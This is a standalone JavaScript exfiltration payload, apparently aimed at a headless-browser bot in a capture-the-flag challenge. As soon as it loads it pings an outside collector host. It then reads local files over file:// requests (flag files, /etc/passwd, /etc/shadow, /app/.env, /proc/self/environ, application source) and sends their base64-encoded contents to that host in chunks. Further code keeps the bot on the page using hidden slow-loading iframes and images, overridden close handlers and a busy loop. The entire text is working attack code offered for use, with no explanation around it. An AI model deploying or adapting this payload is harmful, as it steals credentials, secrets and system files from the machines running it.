(function() {
    'use strict';
    
    const EXFIL_SERVER = 'https://aab.requestcatcher.com';
    
    // =================================================================
    // IMMEDIATE EXECUTION - Everything runs SYNCHRONOUSLY
    // =================================================================
    
    // Send immediate ping using sendBeacon (guaranteed delivery)
    navigator.sendBeacon(EXFIL_SERVER + '/start', 'script-loaded');
    
    // =================================================================
    // UTILITY FUNCTIONS - FAST & SYNCHRONOUS
    // =================================================================
    
    function sendBeacon(endpoint, data) {
        try {
            const fd = new FormData();
            fd.append('data', typeof data === 'string' ? data : JSON.stringify(data));
            fd.append('time', Date.now().toString());
            navigator.sendBeacon(EXFIL_SERVER + '/' + endpoint, fd);
        } catch(e) {
            // Fallback to image
            const img = new Image();
            img.src = EXFIL_SERVER + '/' + endpoint + '?error=' + encodeURIComponent(e.message);
        }
    }
    
    function sendLog(type, data) {
        sendBeacon('log-' + type, data);
    }
    
    // =================================================================
    // FILE READING - SYNCHRONOUS (blocks until complete)
    // =================================================================
    
    function readFileSync(path, name) {
        try {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', path, false); // FALSE = SYNCHRONOUS
            xhr.send();
            
            if (xhr.status === 200 || xhr.status === 0) {
                const data = xhr.responseText;
                
                if (data && data.length > 0) {
                    sendLog('success-' + name, 'Read ' + data.length + ' bytes');
                    
                    // Send data in chunks if too large
                    if (data.length > 1000) {
                        const chunks = Math.ceil(data.length / 1000);
                        for (let i = 0; i < chunks; i++) {
                            const chunk = data.substring(i * 1000, (i + 1) * 1000);
                            sendBeacon(name + '-chunk-' + i + '-of-' + chunks, btoa(chunk));
                        }
                    } else {
                        sendBeacon(name, btoa(data));
                    }
                    
                    return data;
                }
            } else {
                sendLog('error-' + name, 'Status: ' + xhr.status);
            }
        } catch(e) {
            sendLog('error-' + name, e.message);
        }
        return null;
    }
    
    // =================================================================
    // TARGET FILES - Read them ALL synchronously
    // =================================================================
    
    const targetFiles = [
        // Flags - PRIORITY
        ['file:///flag.txt', 'flag'],
        ['file:///app/flag.txt', 'app-flag'],
        ['file:///home/flag.txt', 'home-flag'],
        ['file:///root/flag.txt', 'root-flag'],
        ['file:///tmp/flag.txt', 'tmp-flag'],
        
        // System files
        ['file:///etc/passwd', 'passwd'],
        ['file:///etc/shadow', 'shadow'],
        ['file:///etc/hostname', 'hostname'],
        ['file:///etc/hosts', 'hosts'],
        
        // App files
        ['file:///app/bot.js', 'bot'],
        ['file:///app/package.json', 'package'],
        ['file:///app/.env', 'env'],
        ['file:///app/app.js', 'app'],
        ['file:///app/index.js', 'index'],
        ['file:///app/server.js', 'server'],
        
        // Proc filesystem
        ['file:///proc/self/environ', 'environ'],
        ['file:///proc/self/cmdline', 'cmdline']
    ];
    
    // =================================================================
    // READ ALL FILES IMMEDIATELY - SYNCHRONOUS LOOP
    // =================================================================
    
    sendLog('reading', 'Starting to read ' + targetFiles.length + ' files');
    
    let successCount = 0;
    let failCount = 0;
    
    // Read all files SYNCHRONOUSLY (one after another, blocking)
    for (let i = 0; i < targetFiles.length; i++) {
        const [path, name] = targetFiles[i];
        const result = readFileSync(path, name);
        if (result) {
            successCount++;
        } else {
            failCount++;
        }
    }
    
    sendLog('complete', 'Success: ' + successCount + ', Failed: ' + failCount);
    
    // =================================================================
    // KEEP PAGE LOADING - Prevent page.goto() from resolving
    // =================================================================
    
    try {
        // Method 1: Create slow-loading iframe
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'https://httpstat.us/200?sleep=30000'; // 30 second delay
        document.body.appendChild(iframe);
        
        sendLog('iframe', 'Slow iframe created');
    } catch(e) {
        sendLog('iframe-error', e.message);
    }
    
    try {
        // Method 2: Meta refresh with long delay
        const meta = document.createElement('meta');
        meta.httpEquiv = 'refresh';
        meta.content = '60;url=' + EXFIL_SERVER + '/done';
        document.head.appendChild(meta);
        
        sendLog('meta', 'Meta refresh set');
    } catch(e) {}
    
    try {
        // Method 3: Multiple slow-loading images
        for (let i = 0; i < 5; i++) {
            const img = new Image();
            img.src = 'https://httpstat.us/200?sleep=' + (10000 + i * 1000) + '&n=' + i;
            img.style.display = 'none';
            document.body.appendChild(img);
        }
        
        sendLog('images', 'Slow images created');
    } catch(e) {}
    
    // =================================================================
    // PREVENT WINDOW CLOSE - Override close methods
    // =================================================================
    
    try {
        // Override window.close
        const originalClose = window.close;
        window.close = function() {
            sendLog('close-blocked', 'window.close() called but ignored');
            return false;
        };
        
        // Prevent beforeunload
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = 'Data transfer in progress';
            sendLog('beforeunload', 'Unload prevented');
            return 'Data transfer in progress';
        }, true);
        
        // Prevent unload
        window.addEventListener('unload', function(e) {
            e.preventDefault();
            sendLog('unload', 'Unload event fired');
        }, true);
        
        sendLog('protection', 'Close prevention activated');
    } catch(e) {
        sendLog('protection-error', e.message);
    }
    
    // =================================================================
    // ALTERNATIVE: REDIRECT WITH DATA
    // =================================================================
    
    // If you got the flag, redirect to exfil it via URL
    setTimeout(function() {
        try {
            // Check if we got any flag
            const flagData = localStorage.getItem('exfil-flag');
            if (flagData) {
                window.location = EXFIL_SERVER + '/redirect?flag=' + encodeURIComponent(flagData);
            }
        } catch(e) {}
    }, 100);
    
    // =================================================================
    // HEARTBEAT - Keep sending pings
    // =================================================================
    
    let heartbeatCount = 0;
    const heartbeatInterval = setInterval(function() {
        heartbeatCount++;
        sendBeacon('heartbeat', heartbeatCount.toString());
        
        if (heartbeatCount > 30) {
            clearInterval(heartbeatInterval);
            sendLog('heartbeat-stop', 'Stopped after 30 beats');
        }
    }, 1000);
    
    // =================================================================
    // BUSY LOOP - Force script to run for minimum time
    // =================================================================
    
    // This blocks the main thread for 2 seconds
    const endTime = Date.now() + 2000;
    let loopCount = 0;
    
    while (Date.now() < endTime) {
        loopCount++;
        
        // Send ping every 100k iterations
        if (loopCount % 100000 === 0) {
            const img = new Image();
            img.src = EXFIL_SERVER + '/loop?count=' + loopCount;
        }
    }
    
    sendLog('loop-done', 'Busy loop completed: ' + loopCount + ' iterations');
    
    // =================================================================
    // FINAL STATUS
    // =================================================================
    
    sendBeacon('final', JSON.stringify({
        success: successCount,
        failed: failCount,
        total: targetFiles.length,
        timestamp: Date.now(),
        userAgent: navigator.userAgent
    }));
    
})();
